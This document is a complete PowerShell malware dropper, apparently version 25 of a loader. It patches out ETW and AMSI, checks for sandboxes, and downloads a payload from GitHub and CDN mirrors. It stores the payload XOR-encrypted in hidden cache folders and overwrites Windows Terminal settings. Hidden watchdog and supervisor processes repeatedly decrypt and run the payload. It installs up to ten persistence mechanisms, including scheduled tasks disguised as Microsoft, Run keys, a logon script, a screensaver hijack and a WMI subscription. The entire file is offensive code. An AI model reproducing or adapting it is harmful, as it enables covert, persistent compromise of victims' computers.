# ═══ In-Memory Patches (Polymorphic) ═══
# ETW blind (P/Invoke)
Start-Sleep -Milliseconds 22
$A4ax1 = @"
[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
"@
$anTFTDj = Add-Type -MemberDefinition $A4ax1 -Name 'UpdateEntry35' -Namespace 'LoadContext11' -PassThru
$DvYu3B6G = [int](8026) % 256
$BmQzL = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bnRkbGwuZGxs"))
$LlwCJ4lK = ([char]69+[char]116+[char]119+[char]69+[char]118+[char]101+[char]110+[char]116+[char]87+[char]114+[char]105+[char]116+[char]101)
$NYgY = $anTFTDj::LoadLibrary($BmQzL)
$h3xnmjw6 = $anTFTDj::GetProcAddress($NYgY, $LlwCJ4lK)
$u4zGKPVV = "ZOOGV"
$zWEUbr = 0
$anTFTDj::VirtualProtect($h3xnmjw6, [UIntPtr]::new(1), 0x40, [ref]$zWEUbr) | Out-Null
$jCZ0gVc = [byte[]](0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($jCZ0gVc, 0, $h3xnmjw6, $jCZ0gVc.Length)
$anTFTDj::VirtualProtect($h3xnmjw6, [UIntPtr]::new(1), $zWEUbr, [ref]$zWEUbr) | Out-Null
Start-Sleep -Milliseconds 2

# Runtime memory patch
$T7e1sal = [int](7603) % 256
$i2Bxo3U = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="))
$NIFCJ = [int](7122) % 256
$wmrrs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YW1zaUluaXRGYWlsZWQ="))
$dSaxF = [Ref].Assembly.GetType($i2Bxo3U)
$wK7VdcpX = [int](6492) % 256
$H1bg = $dSaxF.GetField($wmrrs, ([char]78+[char]111+[char]110+[char]80+[char]117+[char]98+[char]108+[char]105+[char]99+[char]44+[char]83+[char]116+[char]97+[char]116+[char]105+[char]99))
$H1bg.SetValue($null, $true)
[void]([Math]::Abs(99599))

# Environment validation
$vVHbKD = [Environment]::ProcessorCount
if ($vVHbKD -lt 2) { exit }
$uzENv = [long]0
try {
    $M17c = Get-Command Get-CimInstance -ErrorAction SilentlyContinue
    if ($null -ne $M17c) {
        $uzENv = [long](Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
    } elseif ($null -ne (Get-Command Get-WmiObject -ErrorAction SilentlyContinue)) {
        $uzENv = [long](Get-WmiObject -Class Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
    }
} catch {
    $uzENv = 0
}
if ($uzENv -gt 0 -and $uzENv -lt 2GB) { exit }
$vuvyK = [System.DateTime]::Now
Start-Sleep -Milliseconds 1766
if (([System.DateTime]::Now - $vuvyK).TotalMilliseconds -lt 1412) { exit }
$ErrorActionPreference='SilentlyContinue'
Set-StrictMode -Off

# ============================================================
# BOOTSTRAP v25 FINAL — Dual launcher (Win10 VBS + Win11 conhost)
# ============================================================

$InstallId = ([guid]::NewGuid().ToString('N').Substring(0,8)).ToUpper()
$osBuild   = [Environment]::OSVersion.Version.Build
$useConhost = ($osBuild -ge 22621)

$psExe   = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$conhost = "$env:SystemRoot\System32\conhost.exe"
$wscript = "$env:SystemRoot\System32\wscript.exe"

$WtSettings = "$env:LOCALAPPDATA\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json"
$WtBackup   = "$env:LOCALAPPDATA\Microsoft\CLR\wts_$InstallId.bak"
$KillFlag   = "$env:TEMP\dag_kill_$InstallId.flag"
$LogFile    = "$env:TEMP\dag_$InstallId.log"
$PidDir     = "$env:TEMP\dag_pid_$InstallId"
$VbsFile    = "$env:LOCALAPPDATA\Microsoft\CLR\wd_$InstallId.vbs"

function Log($m) { try { Add-Content -LiteralPath $LogFile -Value "[$(Get-Date -Format 'HH:mm:ss')] $m" -Encoding UTF8 } catch {} }
function P($m, $c = "Gray") { Write-Host $m -ForegroundColor $c; Log $m }
function IR {
    param([scriptblock]$A, [int]$Max=3, [int]$D=5)
    for ($i=1; $i -le $Max; $i++) {
        $r = $false
        try { $r = & $A } catch { }
        if ($r) { return $true }
        if ($i -lt $Max) { Start-Sleep -Seconds $D }
    }
    return $false
}

Log "=== v25 ID=$InstallId Build=$osBuild Conhost=$useConhost ==="
P "=== v25 FINAL ===" Cyan
P "ID: $InstallId | OS: $osBuild | Launcher: $(if($useConhost){'conhost'}else{'VBS'})" Yellow

# ============================================================
# STEP 1: DOWNLOAD
# ============================================================
$urls = @(
    'https://raw.githubusercontent.com/sangoccnhule1997ac939-spec/magic_ps/main/test.log',
    'https://cdn.jsdelivr.net/gh/sangoccnhule1997ac939-spec/magic_ps@main/test.log',
    'https://cdn.statically.io/gh/sangoccnhule1997ac939-spec/magic_ps/main/test.log'
)
$urlsStr = ($urls | ForEach-Object { "'$_'" }) -join ','

$agent = $null
$ok = IR -Max 5 -D 10 -A {
    foreach ($u in $urls) {
        try {
            $r = Invoke-WebRequest -UseBasicParsing -Uri $u -TimeoutSec 20
            $script:agent = [Text.Encoding]::UTF8.GetString($r.RawContentStream.ToArray())
            if ($script:agent.Length -gt 500) { return $true }
        } catch { }
    }
    return $false
}
if (-not $ok) { P "Download FAILED" Red; return }
P "Download: $($agent.Length) chars" Green

# ============================================================
# STEP 2: XOR + 7 CLONES
# ============================================================
$raw = [Text.Encoding]::UTF8.GetBytes($agent)
$key = [byte[]]::new(32)
[Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($key)
$enc = [byte[]]::new($raw.Length)
for ($i=0; $i -lt $raw.Length; $i++) { $enc[$i] = $raw[$i] -bxor $key[$i%32] }
$blob = [byte[]]::new(32 + $enc.Length)
[Buffer]::BlockCopy($key, 0, $blob, 0, 32)
[Buffer]::BlockCopy($enc, 0, $blob, 32, $enc.Length)

$folders = @(
    "$env:LOCALAPPDATA\Microsoft\Windows\INetCache\IE\Container",
    "$env:LOCALAPPDATA\Microsoft\Windows\WebCache\V01",
    "$env:APPDATA\Microsoft\Windows\Themes\CachedFiles",
    "$env:LOCALAPPDATA\Microsoft\Windows\History\History.IE5",
    "$env:USERPROFILE\.vscode\extensions\.cache",
    "$env:LOCALAPPDATA\Microsoft\Windows\Caches",
    "$env:LOCALAPPDATA\Microsoft\Terminal Server Client\Cache"
)
$clones = @()
foreach ($f in $folders) {
    $folder = $f
    $okC = IR -Max 3 -D 5 -A {
        try {
            if (-not (Test-Path $folder)) { New-Item -ItemType Directory -Path $folder -Force | Out-Null }
            $p = Join-Path $folder "$InstallId.dat"
            [IO.File]::WriteAllBytes($p, $blob)
            if ((Get-Item $p -Force).Length -lt 500) { return $false }
            try { $fi = Get-Item $p -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch { }
            return $true
        } catch { return $false }
    }
    if ($okC) { $clones += (Join-Path $folder "$InstallId.dat") }
}
if ($clones.Count -eq 0) { P "Clone FAILED" Red; return }
P "Clones: $($clones.Count)/7" Green

$clonesStr  = ($clones | ForEach-Object { "'$_'" }) -join ','
$foldersStr = ($folders | ForEach-Object { "'$_'" }) -join ','

# ============================================================
# STEP 3: WT PATCH
# ============================================================
$patchedJson = @'
{
    "$help": "https://aka.ms/terminal-documentation",
    "$schema": "https://aka.ms/terminal-profiles-schema",
    "actions": [],
    "copyFormatting": "none",
    "copyOnSelect": false,
    "defaultProfile": "{61c54bbd-c2c6-5271-96e7-009a87ff44bf}",
    "keybindings": 
    [
        { "id": "Terminal.CopyToClipboard", "keys": "ctrl+c" },
        { "id": "Terminal.DuplicatePaneAuto", "keys": "alt+shift+d" }
    ],
    "newTabMenu": [ { "type": "remainingProfiles" } ],
    "profiles": {
        "defaults": {},
        "list": [
            { "commandline": "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "guid": "{61c54bbd-c2c6-5271-96e7-009a87ff44bf}", "hidden": false, "name": "Windows PowerShell" },
            { "commandline": "%SystemRoot%\\System32\\cmd.exe", "guid": "{0caa0dad-35be-5f56-a8ff-afceeeaa6101}", "hidden": false, "name": "Command Prompt" },
            { "guid": "{b453ae62-4e3d-5e58-b989-0a998ec441b8}", "hidden": false, "name": "Azure Cloud Shell", "source": "Windows.Terminal.Azure" }
        ]
    },
    "schemes": [],
    "themes": []
}
'@
IR -Max 3 -D 5 -A {
    try {
        $agDir = Split-Path $WtBackup -Parent
        if (-not (Test-Path $agDir)) { New-Item -ItemType Directory -Path $agDir -Force | Out-Null }
        [IO.File]::WriteAllText($WtBackup, $patchedJson, [Text.UTF8Encoding]::new($false))
        try { $fi = Get-Item $WtBackup -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch { }
        return (Test-Path $WtBackup)
    } catch { return $false }
} | Out-Null
$wtOK = IR -Max 3 -D 5 -A {
    try {
        if (Test-Path $WtSettings) {
            Copy-Item $WtSettings "$WtSettings.bak_before_$InstallId" -Force -EA 0
            [IO.File]::WriteAllText($WtSettings, $patchedJson, [Text.UTF8Encoding]::new($false))
            return $true
        }
        return $false
    } catch { return $false }
}
P "WT patch: $(if($wtOK){'OK'}else{'SKIP'})" $(if($wtOK){'Green'}else{'Yellow'})

# ============================================================
# STEP 4: BUILD PS WATCHDOG (spawn agent)
# ============================================================
$watchdog = @"
`$ErrorActionPreference='SilentlyContinue'
`$id='$InstallId';`$kill='$KillFlag';`$log='$LogFile';`$pidDir='$PidDir'
`$clones=@($clonesStr);`$folders=@($foldersStr);`$urls=@($urlsStr)
`$target=3;`$wtSettings='$WtSettings';`$wtBackup='$WtBackup'
`$cd="$env:TEMP\dag_cd_$InstallId.txt"
function W(`$m){try{Add-Content `$log "[w] `$(Get-Date -Format 'HH:mm:ss') `$m" -Encoding UTF8}catch{}}
if(Test-Path `$kill){exit}
if(-not(Test-Path `$pidDir)){New-Item -ItemType Directory -Path `$pidDir -Force|Out-Null}
# WT self-heal
try{
  if(Test-Path `$wtBackup){
    `$need=`$false
    if(-not(Test-Path `$wtSettings)){`$need=`$true}
    else{`$c=Get-Content `$wtSettings -Raw -EA 0;if(`$c -match 'Terminal\.PasteFromClipboard'){`$need=`$true}}
    if(`$need){`$bak=[IO.File]::ReadAllText(`$wtBackup,[Text.Encoding]::UTF8);[IO.File]::WriteAllText(`$wtSettings,`$bak,[Text.UTF8Encoding]::new(`$false));W 'wt-restored'}
  }
}catch{}
# Clean dead pids
Get-ChildItem `$pidDir -File -EA 0|%{try{`$p=[int]`$_.Name;if(-not(Get-Process -Id `$p -EA 0)){Remove-Item `$_.FullName -Force -EA 0}}catch{Remove-Item `$_.FullName -Force -EA 0}}
`$alive=@(Get-ChildItem `$pidDir -File -EA 0).Count
if(`$alive -ge `$target){exit}
# Find clones
`$ex=@();foreach(`$c in `$clones){if(Test-Path `$c){`$ex+=[string]`$c}}
if(`$ex.Count -eq 0){
  # Network fallback
  if(Test-Path `$cd){try{`$l=[datetime]::Parse((Get-Content `$cd -Raw).Trim());if(((Get-Date)-`$l).TotalMinutes -lt 5){exit}}catch{}}
  Set-Content `$cd -Value (Get-Date).ToString('o') -Force
  `$dl=`$null
  foreach(`$u in `$urls){try{`$r=iwr -UseBasicParsing -Uri `$u -TimeoutSec 20;`$dl=[Text.Encoding]::UTF8.GetString(`$r.RawContentStream.ToArray());if(`$dl.Length -gt 500){break}else{`$dl=`$null}}catch{}}
  if(-not `$dl){exit}
  `$raw=[Text.Encoding]::UTF8.GetBytes(`$dl);`$key=[byte[]]::new(32);[Security.Cryptography.RandomNumberGenerator]::Create().GetBytes(`$key)
  `$enc=[byte[]]::new(`$raw.Length);for(`$i=0;`$i -lt `$raw.Length;`$i++){`$enc[`$i]=`$raw[`$i] -bxor `$key[`$i%32]}
  `$blob=[byte[]]::new(32+`$enc.Length);[Buffer]::BlockCopy(`$key,0,`$blob,0,32);[Buffer]::BlockCopy(`$enc,0,`$blob,32,`$enc.Length)
  `$rs=@();foreach(`$f in `$folders){try{if(-not(Test-Path `$f)){New-Item -ItemType Directory -Path `$f -Force|Out-Null};`$p=Join-Path `$f "`$id.dat";[IO.File]::WriteAllBytes(`$p,`$blob);try{`$fi=Get-Item `$p -Force;`$fi.Attributes=`$fi.Attributes -bor [IO.FileAttributes]::Hidden}catch{};`$rs+=[string]`$p}catch{}}
  if(`$rs.Count -eq 0){exit}
  `$code=`$rs[0];W 'net-restored'
}else{
  if(`$ex.Count -lt `$clones.Count){try{`$sb=[IO.File]::ReadAllBytes(`$ex[0]);foreach(`$c in `$clones){if(-not(Test-Path `$c)){try{`$d=Split-Path `$c -Parent;if(-not(Test-Path `$d)){New-Item -ItemType Directory -Path `$d -Force|Out-Null};[IO.File]::WriteAllBytes(`$c,`$sb);try{`$fi=Get-Item `$c -Force;`$fi.Attributes=`$fi.Attributes -bor [IO.FileAttributes]::Hidden}catch{}}catch{}}}}catch{}}
  `$code=`$ex[0]
}
if(-not `$code -or -not(Test-Path `$code)){exit}
Set-Content (Join-Path `$pidDir `$PID) -Value 'x' -Force
try{`$d=[IO.File]::ReadAllBytes(`$code);`$k=`$d[0..31];`$x=`$d[32..(`$d.Length-1)];`$c=[byte[]]::new(`$x.Length);for(`$i=0;`$i -lt `$x.Length;`$i++){`$c[`$i]=`$x[`$i] -bxor `$k[`$i%32]};`$payload=[Text.Encoding]::UTF8.GetString(`$c)}catch{Remove-Item (Join-Path `$pidDir `$PID) -Force -EA 0;exit}
try{`$sb2=[ScriptBlock]::Create(`$payload);& `$sb2}catch{W ('exec-fail: '+`$_)}finally{Remove-Item (Join-Path `$pidDir `$PID) -Force -EA 0}
"@
$watchdogEnc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($watchdog))
P "Watchdog: $($watchdogEnc.Length) chars" Green

# ============================================================
# STEP 5: BUILD LAUNCHER (VBS hoặc conhost tùy OS)
# ============================================================
if ($useConhost -and (Test-Path $conhost)) {
    $launcherExe  = $conhost
    $launcherArgs = "--headless `"$psExe`" -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $watchdogEnc"
    $supLauncherExe  = $conhost
    P "Launcher: conhost --headless (no flash)" Green
} else {
    # Win10 — VBS wrapper (no flash)
    if (-not (Test-Path $wscript)) { P "wscript not found" Red; return }
    $q = [int]($watchdogEnc.Length / 4)
    $p1 = $watchdogEnc.Substring(0, $q)
    $p2 = $watchdogEnc.Substring($q, $q)
    $p3 = $watchdogEnc.Substring($q*2, $q)
    $p4 = $watchdogEnc.Substring($q*3)
    $vbsContent = "Dim a,b,c,d`r`n" +
        "a=`"$p1`"`r`n" +
        "b=`"$p2`"`r`n" +
        "c=`"$p3`"`r`n" +
        "d=`"$p4`"`r`n" +
        "CreateObject(`"WScript.Shell`").Run `"$psExe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand `"&a&b&c&d,0,False"
    $vbsOK = IR -Max 3 -D 5 -A {
        try {
            $agDir = Split-Path $VbsFile -Parent
            if (-not (Test-Path $agDir)) { New-Item -ItemType Directory -Path $agDir -Force | Out-Null }
            [IO.File]::WriteAllText($VbsFile, $vbsContent, [Text.Encoding]::ASCII)
            return (Test-Path $VbsFile)
        } catch { return $false }
    }
    if (-not $vbsOK) { P "VBS write FAILED" Red; return }
    try { $fi = Get-Item $VbsFile -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch { }
    $launcherExe  = $wscript
    $launcherArgs = "`"$VbsFile`""
    $supLauncherExe  = $wscript
    P "Launcher: VBS wscript (no flash)" Green
}

# ============================================================
# STEP 6: BUILD SUPERVISOR (PS loop 15s, respawn nhanh)
# ============================================================
$supInner = @"
`$ErrorActionPreference='SilentlyContinue'
`$id='$InstallId';`$kill='$KillFlag';`$log='$LogFile';`$pidDir='$PidDir'
`$mutexName='Global\DAG_Sup_$InstallId';`$target=3
`$useConhost=$([int]$useConhost)
`$conhost='$conhost';`$psExe='$psExe';`$wscript='$wscript';`$vbsFile='$VbsFile'
`$watchdogEnc='$watchdogEnc'
`$cd="$env:TEMP\dag_sup_$InstallId.txt"
function W(`$m){try{Add-Content `$log "[sup] `$(Get-Date -Format 'HH:mm:ss') `$m" -Encoding UTF8}catch{}}
if(Test-Path `$kill){exit}
try{`$x=[Threading.Mutex]::OpenExisting(`$mutexName);`$x.Dispose();W 'already-running';exit}catch{}
`$m=New-Object Threading.Mutex(`$false,`$mutexName)
try{
  W ('start pid='+`$PID)
  while(`$true){
    if(Test-Path `$kill){break}
    if(-not(Test-Path `$pidDir)){New-Item -ItemType Directory -Path `$pidDir -Force|Out-Null}
    Get-ChildItem `$pidDir -File -EA 0|%{try{`$p=[int]`$_.Name;if(-not(Get-Process -Id `$p -EA 0)){Remove-Item `$_.FullName -Force -EA 0}}catch{Remove-Item `$_.FullName -Force -EA 0}}
    `$alive=@(Get-ChildItem `$pidDir -File -EA 0).Count
    if(`$alive -lt `$target){
      if(Test-Path `$cd){try{`$l=[datetime]::Parse((Get-Content `$cd -Raw).Trim());if(((Get-Date)-`$l).TotalSeconds -lt 8){Start-Sleep 5;continue}}catch{}}
      Set-Content `$cd -Value (Get-Date).ToString('o') -Force
      `$need=`$target-`$alive
      W "spawn `$need (alive=`$alive)"
      for(`$i=0;`$i -lt `$need;`$i++){
        try{
          if(`$useConhost -eq 1){
            Start-Process `$conhost -ArgumentList @('--headless',('"'+`$psExe+'"'),'-NoProfile','-NonInteractive','-ExecutionPolicy','Bypass','-EncodedCommand',`$watchdogEnc) -WindowStyle Hidden -EA 0
          }else{
            Start-Process `$wscript -ArgumentList ('"'+`$vbsFile+'"') -WindowStyle Hidden -EA 0
          }
          Start-Sleep -Milliseconds 900
        }catch{}
      }
    }
    Start-Sleep -Seconds 15
  }
}finally{try{`$m.ReleaseMutex()}catch{};try{`$m.Dispose()}catch{}}
"@

if ($useConhost) {
    $supArgs = "--headless `"$psExe`" -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($supInner)))"
    $supExe = $conhost
} else {
    # Supervisor chạy hidden bằng VBS riêng
    $supEncB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($supInner))
    $supVbsFile = "$env:LOCALAPPDATA\Microsoft\CLR\ws_$InstallId.vbs"
    $sq = [int]($supEncB64.Length / 4)
    $s1 = $supEncB64.Substring(0, $sq)
    $s2 = $supEncB64.Substring($sq, $sq)
    $s3 = $supEncB64.Substring($sq*2, $sq)
    $s4 = $supEncB64.Substring($sq*3)
    $supVbsContent = "Dim a,b,c,d`r`n" +
        "a=`"$s1`"`r`n" +
        "b=`"$s2`"`r`n" +
        "c=`"$s3`"`r`n" +
        "d=`"$s4`"`r`n" +
        "CreateObject(`"WScript.Shell`").Run `"$psExe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand `"&a&b&c&d,0,False"
    [IO.File]::WriteAllText($supVbsFile, $supVbsContent, [Text.Encoding]::ASCII)
    try { $fi = Get-Item $supVbsFile -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch { }
    $supExe = $wscript
    $supArgs = "`"$supVbsFile`""
}
P "Supervisor built" Green

# ============================================================
# STEP 7: PERSISTENCE (10 vectors — task 1min offset 20s)
# ============================================================
$installed = 0

# 7.1 Tasks x3 (offset 20s, repeat 1min)
$offsets = @(20, 40, 60)
$names   = @("Wdrv${InstallId}", "Wcmp${InstallId}", "Wsec${InstallId}")
for ($idx=0; $idx -lt 3; $idx++) {
    $taskName = $names[$idx]
    $offSec = $offsets[$idx]
    $tOK = IR -Max 3 -D 10 -A {
        try {
            $sched = New-Object -ComObject Schedule.Service
            $sched.Connect()
            $tf = $sched.GetFolder('\')
            $t = $sched.NewTask(0)
            $t.RegistrationInfo.Description = "Windows Service Helper"
            $t.RegistrationInfo.Author = "Microsoft Corporation"
            $t.Settings.Enabled = $true
            $t.Settings.Hidden = $true
            $t.Settings.StartWhenAvailable = $true
            $t.Settings.DisallowStartIfOnBatteries = $false
            $t.Settings.StopIfGoingOnBatteries = $false
            $t.Settings.ExecutionTimeLimit = "PT30S"
            $t.Settings.MultipleInstances = 2
            $tr1 = $t.Triggers.Create(9); $tr1.UserId = "$env:USERDOMAIN\$env:USERNAME"
            $tr2 = $t.Triggers.Create(1)
            $tr2.StartBoundary = (Get-Date).AddSeconds($offSec).ToString("yyyy-MM-ddTHH:mm:ss")
            $tr2.Repetition.Interval = "PT1M"
            $ac = $t.Actions.Create(0)
            $ac.Path = $supExe
            $ac.Arguments = $supArgs
            $t.Principal.UserId = "$env:USERDOMAIN\$env:USERNAME"
            $t.Principal.LogonType = 3
            $t.Principal.RunLevel = 0
            $tf.RegisterTaskDefinition($taskName, $t, 6, $null, $null, 3, $null) | Out-Null
            Start-Sleep -Milliseconds 500
            return [bool](Get-ScheduledTask -TaskName $taskName -EA 0)
        } catch { return $false }
    }
    if ($tOK) { $installed++ }
}

# 7.2 Registry x4
$runCmd = "`"$supExe`" $supArgs"
foreach ($reg in @(
    @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; Name="Wdrv$InstallId"},
    @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce'; Name="Wupd$InstallId"},
    @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run'; Name="Wpol$InstallId"},
    @{Path='HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows'; Name='load'}
)) {
    $rc = $reg
    $rOK = IR -Max 3 -D 5 -A {
        try {
            if (-not (Test-Path $rc.Path)) { New-Item -Path $rc.Path -Force | Out-Null }
            Set-ItemProperty -Path $rc.Path -Name $rc.Name -Value $runCmd -Force
            return [bool]((Get-ItemProperty -Path $rc.Path -Name $rc.Name -EA 0).$($rc.Name))
        } catch { return $false }
    }
    if ($rOK) { $installed++ }
}

# 7.3 Startup CMD
$sOK = IR -Max 3 -D 5 -A {
    try {
        $cmd = Join-Path ([Environment]::GetFolderPath('Startup')) "W$InstallId.cmd"
        [IO.File]::WriteAllText($cmd, "@echo off`r`nstart `"`" /b `"$supExe`" $supArgs`r`nexit", [Text.Encoding]::ASCII)
        try { $fi = Get-Item $cmd -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch { }
        return (Test-Path $cmd)
    } catch { return $false }
}
if ($sOK) { $installed++ }

# 7.4 LogonScript
$lOK = IR -Max 3 -D 5 -A {
    try {
        $cmdPath = "$env:TEMP\.w$InstallId.cmd"
        [IO.File]::WriteAllText($cmdPath, "@echo off`r`nstart `"`" /b `"$supExe`" $supArgs`r`nexit", [Text.Encoding]::ASCII)
        Set-ItemProperty 'HKCU:\Environment' -Name 'UserInitMprLogonScript' -Value $cmdPath -Force
        return [bool]((Get-ItemProperty 'HKCU:\Environment' -Name 'UserInitMprLogonScript' -EA 0).UserInitMprLogonScript)
    } catch { return $false }
}
if ($lOK) { $installed++ }

# 7.5 Screensaver
$scrOK = IR -Max 3 -D 5 -A {
    try {
        $scr = "$env:TEMP\.w$InstallId.scr"
        [IO.File]::WriteAllText($scr, "@echo off`r`nstart `"`" /b `"$supExe`" $supArgs`r`nexit", [Text.Encoding]::ASCII)
        try { $fi = Get-Item $scr -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch { }
        Set-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'SCRNSAVE.EXE' -Value $scr -Force
        Set-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'ScreenSaveActive' -Value '1' -Force
        Set-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'ScreenSaveTimeOut' -Value '600' -Force
        return [bool]((Get-ItemProperty 'HKCU:\Control Panel\Desktop' -Name 'SCRNSAVE.EXE' -EA 0).'SCRNSAVE.EXE')
    } catch { return $false }
}
if ($scrOK) { $installed++ }

# 7.6 WMI (admin only)
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) {
    $wmiOK = IR -Max 2 -D 5 -A {
        try {
            $q = "SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
            $f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name="Wd$InstallId";EventNamespace="root\cimv2";Query=$q} -EA Stop
            $c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name="Wdc$InstallId";CommandLineTemplate="`"$supExe`" $supArgs"} -EA Stop
            Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c} -EA Stop | Out-Null
            return $true
        } catch { return $false }
    }
    if ($wmiOK) { $installed++ }
}
P "Vectors: $installed" Green

# ============================================================
# STEP 8: LAUNCH
# ============================================================
# Launch 3 agents
for ($i=0; $i -lt 3; $i++) {
    if ($useConhost) {
        Start-Process $conhost -ArgumentList @('--headless',('"'+$psExe+'"'),'-NoProfile','-NonInteractive','-ExecutionPolicy','Bypass','-EncodedCommand',$watchdogEnc) -WindowStyle Hidden -EA 0
    } else {
        Start-Process $wscript -ArgumentList ('"'+$VbsFile+'"') -WindowStyle Hidden -EA 0
    }
    Start-Sleep -Milliseconds 900
}
P "3 agents spawned" Green

# Launch supervisor
if ($useConhost) {
    Start-Process $conhost -ArgumentList @('--headless',('"'+$psExe+'"'),'-NoProfile','-NonInteractive','-ExecutionPolicy','Bypass','-EncodedCommand',$([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($supInner)))) -WindowStyle Hidden -EA 0
} else {
    Start-Process $wscript -ArgumentList ('"'+$supVbsFile+'"') -WindowStyle Hidden -EA 0
}
P "Supervisor spawned" Green

# ============================================================
# STEP 9: VERIFY
# ============================================================
Start-Sleep -Seconds 20
$alive = 0
if (Test-Path $PidDir) { $alive = @(Get-ChildItem $PidDir -File -EA 0).Count }

$supAlive = $false
try {
    $supEncB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($supInner))
    $supPrefix = $supEncB64.Substring(0, 40)
    Get-CimInstance Win32_Process -EA 0 | Where-Object {
        $_.CommandLine -and $_.CommandLine -match [regex]::Escape($supPrefix)
    } | ForEach-Object { $supAlive = $true }
} catch { }

P ""
P "====================================" Cyan
P "ID        : $InstallId" Yellow
P "OS Build  : $osBuild"
P "Launcher  : $(if($useConhost){'conhost --headless'}else{'VBS wscript'})"
P "Clones    : $($clones.Count)/7"
P "Agents    : $alive/3" $(if($alive -ge 3){'Green'}elseif($alive -ge 1){'Yellow'}else{'Red'})
P "Supervisor: $(if($supAlive){'RUNNING'}else{'DEAD'})" $(if($supAlive){'Green'}else{'Red'})
P "Vectors   : $installed"
P "Respawn   : sup 15s + task 1m offset 20s"
P "Log       : $LogFile"
P "====================================" Cyan

if ($alive -ge 3 -and $supAlive) { P ">>> SUCCESS" Green }
elseif ($alive -ge 1) { P ">>> PARTIAL" Yellow }
else { P ">>> FAILED" Red }

Log "=== v25 done ==="
